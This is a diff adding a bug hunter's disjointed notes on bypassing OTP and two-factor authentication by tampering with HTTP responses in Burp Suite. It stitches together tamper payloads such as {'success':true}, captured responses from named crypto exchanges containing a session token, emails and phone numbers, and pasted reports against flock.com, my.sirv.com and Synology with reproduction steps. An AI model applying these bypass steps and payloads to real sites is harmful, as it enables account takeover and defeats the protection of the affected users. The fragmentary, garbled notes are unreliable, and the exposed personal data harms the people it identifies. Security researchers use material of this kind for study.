@@ -1,0 +1,288 @@
+I Aditya Shende, found very critical issue in your all subdomains.
+ All your subdomains using same functionality to create team but they ask for OTP verification fo mail id. I found  that it can be bypassed with some burpsuite tricks.
+
+Your subdomain list: https://www.virustotal.com/gui/domain/flock.com/relations
+
+What I done: 
+I create one account using my company address and send it to repeater and hit GO . 
+Now response is valid because I use valid OTP to create account but I use that Response to create your company mail id(security@flock.com) even if I use wrong OTP > 
+Successfully created account with wrong OTP.
+
+Impact: Breaking privacy policies and most of time this type of authorities is only for admin like creating account without OTP. In this case its User to admin privilege escalation. User is also create account without knowing valid OTP
+
+
+
+Site : Card = OTP = OTP valid = success
+
+2fa/mfa bug =!
+
+workflow 
+
+
+2FA-mfa - security misconfig
+
+
+Andriod OTP for login - ATO
+
+Website - Log
+
+User :- login - enter creds - otp - valid - success - dashboard 
+
+
+Bug Bounty Hunter 
+
+Website - login - enter creds - auth backend - 200 > OTP page + 1234 , 123456 > OTP invalid > 401 , 403, 400 > Response = 200 , 302 found > Logged in
+
+
+ok 
+true
+false
+
+
+
+
+
+
+
+3 min
+7 seconds
+10 seconds
+10 mins
+
+
+Google Auth - 7 10 seconds
+
+
+
+Syntax
+How to check ?
+
+Response
+Request 
+
+JSON syntax
+
+{"param":"value"}
+
+
+
+Exploit:
+
+1. Enter valid OTP 
+2. Check respone
+3. Copy response
+
+
+HTTP/1.1 200 OK
+Date: Sun, 30 Jul 2023 09:33:19 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 563
+Connection: close
+X-Powered-By: Express
+X-RateLimit-Limit: 30
+X-RateLimit-Remaining: 26
+X-RateLimit-Reset: 1690709602
+Access-Control-Allow-Origin: https://trade.bitaroo.com.au
+Vary: Origin, Accept-Encoding
+ETag: W/"233-5fBQDfzk/y6PUVecU52TqUuSX8k"
+
+{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjU5ODIsInRva2VuIjoiWmwyLUZqdWwiLCJpYXQiOjE2OTA3MDk1OTl9.YbEb8_lC5rD9WBXrKfU-LYkkZEJHmwdFjg9Wxp3cdBE","email":"adityacshende+879@gmail.com","firstName":"test","lastName":"hack","takerFee":0.19,"makerFee":0.15,"emailVerified":0,"kyc":0,"kycLevel":0,"status":0,"settings":{"confirmNewOrder":1,"confirmCancelOrder":1,"showMarketDepth":0,"enLogin":1,"enIpChange":1,"enWrongPassword":1,"enPasswordChange":1,"enDeposit":1,"enWithdrawal":1,"enExpress":1,"enDca":1,"enDcaFailed":1,"enTrade":1},"tfaEnabled":true}
+
+
+
+
+
+
+
+HTTP/1.1 200 OK
+Date: Sun, 23 Oct 2022 09:36:48 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 560
+Connection: close
+X-Powered-By: Express
+X-RateLimit-Limit: 30
+X-RateLimit-Remaining: 28
+X-RateLimit-Reset: 1666517861
+Access-Control-Allow-Origin: https://trade.bitaroo.com.au
+Vary: Origin, Accept-Encoding
+ETag: W/"230-y74lUtvkWEuudze1uVJmvApDt64"
+
+{"email":"adityacshende+7894@gmail.com","firstName":"ad","lastName":"ad","takerFee":0.19,"makerFee":0.15,"emailVerified":1,"kyc":0,"kycLevel":0,"status":0,"settings":{"confirmNewOrder":1,"confirmCancelOrder":1,"showMarketDepth":0,"enLogin":1,"enIpChange":1,"enWrongPassword":1,"enPasswordChange":1,"enDeposit":1,"enWithdrawal":1,"enExpress":1,"enDca":1,"enDcaFailed":1,"enTrade":1},"tfaEnabled":true}
+
+
+
+Tip:
+Testing for 2FA bypass ?
+
+Your response code : 302,400,403 etc
+
+Tamper it with 200 OK
+
+Add following context response 
+
+
+Or
+
+verified 
+
+
+{"success":true}
+{"success":"true"}
+{"isValid":1}
+{"message":success}
+{"status":"true"}
+{"success":true}
+
+
+I have found a vulnerability in your website. Here is the detailed report:
+
+Vulnerability Name: 2 Factor Authentication Bypass via Response Manipulation
+Vulnerable Domain:  my.sirv.com
+Description:
+It's possible to bypass 2 factor authentication in your website by simply manipulating the response.
+
+Steps to Reproduce:
+1. Create an account and enable 2FA in that account.
+2. Go to https://my.sirv.com and login using your credentials.
+3. Now it will ask for 2FA code. Enter any random code and click on verify code.
+4. Capture the request using Burp Suite. Right click on the request , click on "Do intercept" ----> "Response to this request".
+5. Change the status code to 200 OK and body of the response with the following JSON body:
+"OK"
+
+You'll see that you'll be logged in.
+
+Impact:
+Impact of this vulnerability is serious because it'll allow an attacker to bypass the 2 factor authentication and takeover any account if he knows the password of the account. This makes your 2 factor authentication system useless since anyone can bypass it.
+
+Possible Remediation:
+Using an encrypted token in the response would fix this issue.
+
+Hope this'll be fixed as soon as possible.
+
+
+HTTP/1.1 201 Created
+Date: Sun, 30 Jul 2023 09:50:18 GMT
+Content-Type: application/json
+Connection: close
+Cache-Control: no-cache, private
+X-RateLimit-Limit: 200
+X-RateLimit-Remaining: 199
+Access-Control-Allow-Origin: https://exchange.fastex.com
+Vary: Origin
+Strict-Transport-Security: max-age=15724800; includeSubDomains
+Request-Id: a9a15f4ecb9130cc6d8bf2d60556cfe8
+X-Forwarded-Host: exchange.fastex.com
+X-Forwarded-Proto: https
+X-Forwarded-For: 45.115.58.138, 45.115.58.138
+CF-Cache-Status: DYNAMIC
+Server: cloudflare
+CF-RAY: 7eecb253fcde3c52-BOM
+Content-Length: 2
+
+{}
+
+
+
+
+"messageSuccess":"Login success"
+
+
+
+1. Less tokens : Request/Response - more bugs
+
+
+
+HTTP/1.1 200 OK
+Expires: Tue, 01 Jan 1980 1:00:00 GMT
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Trace-Id: 2a896eb860e73611beab91995ef40466,lep4aw0omk1qtstni2zy02i0nag6eg7t,,
+Access-Control-Expose-Headers: IS-PERSONAL-KYC-AVAILABLE
+Date: Sun, 23 Oct 2022 10:05:50 GMT
+IS-PERSONAL-KYC-AVAILABLE: true
+Access-Control-Allow-Origin: https://www.nicex.com
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Content-Type: application/json
+Via: 1.1 google
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+Connection: close
+Content-Length: 16
+
+{"success":true}
+
+
+
+
+error: success
+false : true
+0 : 1
+inValid : Valid
+message : success
+
+
+
+Hello Team,
+
+
+Aditya here , I  found  session puzzling misconfiguration in accounts.synology.com where I am able to make a glitch between phone verification which leads to update number without OTP validation:
+
+
+Description: Session Puzzling is an application level vulnerability which can enable an attacker to perform a variety of malicious actions, including but not limited to:
+
+1.Bypass efficient authentication enforcement mechanisms, and impersonate legitimate users.
+
+2. Skip over qualifying phases in multi-phase processes, even if the process includes all the commonly recommended OTP level restrictions.
+
+Scenario : When testing on https://account.synology.com , I found many secure endpoints or functions which need authentication and it is protected . But while testing add or update phone numbers I found an issue. 1st it asked for OTP verification on phone number see below screenshot:
+IMG-3298.jpg
+I didn't pass OTP but after refreshing the website I performed a phone number update and without OTP verification my number gets updated. Same thing I tried on email verification but it's secure enough .
+
+
+Steps:
+
+1. Login to account in  accounts.synology.com
+2. Go to phone number update
+3. Enter number , It will send OTP on number 
+4. Don't enter OTP  and refresh site 
+5. Again perform step 2 & 3
+6. It will update number without asking or verifying OTP
+
+Reference: https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.session_puzzling_spring
+
+Solution:
+
+1. Use Different Objects for Authenticated / Unauthenticated Zones
+
+2. It's important to make sure that the session objects used in the unauthenticated section of the application will differ from those used in the authenticated entry points
+
+3. Revalidate refresh issues in session and add strict validation on phone number and email update 
+
+Note : I am adding emailsecurity.mp4 as secure function view and POC.mp4 as an issue
+
+
+
+
+
+
+
+Request and response
+
+Response 
+
+
+Valid response - Valid OTP
+Provide wrong OTP - Tamper the response with valid OTP response
+
+
+
+IMP: Response should not include session , cookies , tokens.
+
+
+
+
+
+             Attacker
+Register : 9049539676 = OTP + Check response = 9049539676 + 7820800190 = forward request = We can force a user to creating account without his/her interaction
